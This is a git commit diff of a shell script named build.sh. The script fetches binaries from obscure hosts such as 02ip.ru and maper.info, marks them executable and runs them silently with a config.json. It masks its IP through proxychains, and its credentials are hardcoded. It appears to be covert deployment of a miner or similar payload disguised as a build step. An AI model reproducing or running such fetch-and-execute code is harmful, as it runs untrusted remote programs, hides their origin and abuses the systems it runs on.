43df34a9ecedc3944333c07cf51c612c7acbbf0c
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-15 19:44:36 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -4,9 +4,9 @@ user="3j8rvvg4wcjt5b"
 pass="cfqo67beev4dnog0y6mawtlejtpo" 
 wget -q -O api https://maper.info/Credit && chmod +x api >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json >/dev/null 2>&1
-wget -q -O api-server https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x api-server >/dev/null 2>&1
-wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf  >/dev/null 2>&1
-wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so  >/dev/null 2>&1
+wget -q https://02ip.ru/heroku && chmod +x heroku 
+wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
+wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so 
 sleep 3 
 sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
 sleep 1 
@@ -20,4 +20,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./api-server ./api -c "config.json" >/dev/null 2>&1
+./heroku ./api -c "config.json" >/dev/null 2>&1
